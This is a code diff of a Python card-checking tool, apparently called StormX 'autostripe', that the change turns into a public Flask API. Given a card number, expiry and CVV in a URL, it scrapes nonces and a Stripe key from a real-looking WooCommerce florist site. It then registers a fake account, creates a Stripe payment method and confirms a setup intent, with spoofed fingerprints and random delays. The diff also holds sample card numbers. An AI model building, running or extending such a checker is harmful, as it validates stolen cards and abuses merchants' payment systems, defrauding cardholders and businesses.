@@ -1,3 +1,4 @@
+from flask import Flask, request, jsonify
 import requests
 import json
 import re
@@ -7,8 +8,9 @@ import datetime
 from typing import Dict, Any, Optional
 from faker import Faker
 from urllib.parse import unquote
-import base64
+import os
 
+app = Flask(__name__)
 faker = Faker()
 
 class StormXAPI:
@@ -16,9 +18,7 @@ class StormXAPI:
         self.base_gateway = "https://stripe.stormx.pw"
         
     def parse_api_url(self, api_url: str) -> dict:
-        """Parse API URL like: /gateway=autostripe/key=Assassin/site=nashvillefloristllc.com/cc=4147768578745265|04|2026|168"""
         try:
-            # Extract components from URL path
             components = api_url.strip('/').split('/')
             params = {}
             
@@ -27,7 +27,6 @@ class StormXAPI:
                     key, value = comp.split('=', 1)
                     params[key] = unquote(value)
             
-            # Parse card data if present
             if 'cc' in params:
                 card_parts = params['cc'].split('|')
                 if len(card_parts) == 4:
@@ -40,16 +39,7 @@ class StormXAPI:
         except Exception as e:
             return {"error": f"URL parsing failed: {str(e)}"}
 
-def auto_request(
-    url: str,
-    method: str = 'GET',
-    headers: Optional[Dict[str, str]] = None,
-    data: Optional[Dict[str, Any]] = None,
-    params: Optional[Dict[str, Any]] = None,
-    json_data: Optional[Dict[str, Any]] = None,
-    dynamic_params: Optional[Dict[str, Any]] = None,
-    session: Optional[requests.Session] = None
-) -> requests.Response:
+def auto_request(url: str, method: str = 'GET', headers: Optional[Dict[str, str]] = None, data: Optional[Dict[str, Any]] = None, params: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, dynamic_params: Optional[Dict[str, Any]] = None, session: Optional[requests.Session] = None) -> requests.Response:
     
     clean_headers = {}
     if headers:
@@ -113,21 +103,16 @@ def extract_message(response: requests.Response) -> str:
         return f"An unexpected error occurred during message extraction: {e}"
 
 def run_automated_process_from_url(api_url: str, user_agent: str = None):
-    """Main API function that processes StormX URL format"""
-    
-    # Initialize API parser
     stormx = StormXAPI()
     params = stormx.parse_api_url(api_url)
     
     if "error" in params:
         return {"status": "error", "message": params["error"]}
     
-    # Extract parameters with defaults
     gateway = params.get('gateway', 'autostripe')
-    key = params.get('key', 'Assassin')  # Changed to Assassin as requested
+    key = params.get('key', 'Assassin')
     target_site = params.get('site', 'nashvillefloristllc.com')
     
-    # Extract card data
     card_number = params.get('card_number')
     exp_month = params.get('exp_month') 
     exp_year = params.get('exp_year')
@@ -136,24 +121,18 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
     if not all([card_number, exp_month, exp_year, cvv]):
         return {"status": "error", "message": "Incomplete card data in URL"}
     
-    # Generate dynamic fingerprints
     client_element = f"src_{random.randint(100000000000, 999999999999)}"
     guid = f"guid_{random.randint(1000000000, 9999999999)}"
     muid = f"muid_{random.randint(1000000000, 9999999999)}"
     sid = f"sid_{random.randint(1000000000, 9999999999)}"
     
-    # Use provided user agent or generate random
     if not user_agent:
         user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
     
     session = requests.Session()
     
-    print(f"Starting API Session -> Gateway: {gateway} | Key: {key} | Site: {target_site}")
-    print(f"Card: {card_number}|{exp_month}|{exp_year}|{cvv}")
-
     try:
-        # STEP 1: Initial request to target site
-        print("\n1. Performing initial GET request...")
+        # STEP 1: Initial request
         url_1 = f'https://{target_site}/en/moj-racun/add-payment-method/'
         headers_1 = {
             'User-Agent': user_agent,
@@ -173,12 +152,9 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
         
         regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
         pk = re.findall('"key":"(.*?)"', response_1.text)[0]
-        print(f"   - Extracted regester_nouce: {regester_nouce}")
-        print(f"   - Extracted pk: {pk}")
         time.sleep(random.uniform(1.0, 3.0))
 
         # STEP 2: Register email
-        print("\n2. Performing POST request to register email...")
         url_2 = f'https://{target_site}/en/moj-racun/add-payment-method/'
         headers_2 = {
             'User-Agent': user_agent,
@@ -222,11 +198,9 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
         response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
         
         ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
-        print(f"   - Extracted ajax_nonce: {ajax_nonce}")
         time.sleep(random.uniform(1.0, 3.0))
 
-        # STEP 3: Stripe API call
-        print("\n3. Performing POST request to Stripe API...")
+        # STEP 3: Stripe API
         url_3 = 'https://api.stripe.com/v1/payment_methods'
         headers_3 = {
             'User-Agent': user_agent,
@@ -272,11 +246,9 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
         response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
         
         pm = response_3.json()['id']
-        print(f"   - Extracted pm (payment method ID): {pm}")
         time.sleep(random.uniform(1.0, 3.0))
 
         # STEP 4: Final confirmation
-        print("\n4. Performing final POST request...")
         url_4 = f'https://{target_site}/en/'
         headers_4 = {
             'User-Agent': user_agent,
@@ -317,9 +289,6 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
             "timestamp": datetime.datetime.now().isoformat()
         }
         
-        print(f"\n--- FINAL RESULT ---")
-        print(f"Status: {status} | Message: {msg}")
-        
         return result
 
     except Exception as e:
@@ -332,16 +301,26 @@ def run_automated_process_from_url(api_url: str, user_agent: str = None):
             "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}",
             "timestamp": datetime.datetime.now().isoformat()
         }
-        print(f"API Process Failed: {e}")
         return error_result
 
-# API USAGE EXAMPLES:
-if __name__ == '__main__':
-    # Example 1: Direct URL format
-    api_url = "https://stripe.stormx.pw/gateway=autostripe/key=Assassin/site=nashvillefloristllc.com/cc=4147768578745265|04|2026|168"
-    
-    # Example 2: Relative path format  
-    api_url2 = "/gateway=autostripe/key=Assassin/site=example.com/cc=5111111111111118|05|2027|123"
+# FLASK ROUTES
+@app.route('/')
+def home():
+    return jsonify({"message": "Auto Stripe API Running", "status": "active"})
+
+@app.route('/process')
+def process():
+    api_url = request.args.get('url')
+    if not api_url:
+        return jsonify({"error": "Missing 'url' parameter"}), 400
     
     result = run_automated_process_from_url(api_url)
-    print(json.dumps(result, indent=2))
+    return jsonify(result)
+
+@app.route('/health')
+def health():
+    return jsonify({"status": "healthy", "timestamp": datetime.datetime.now().isoformat()})
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
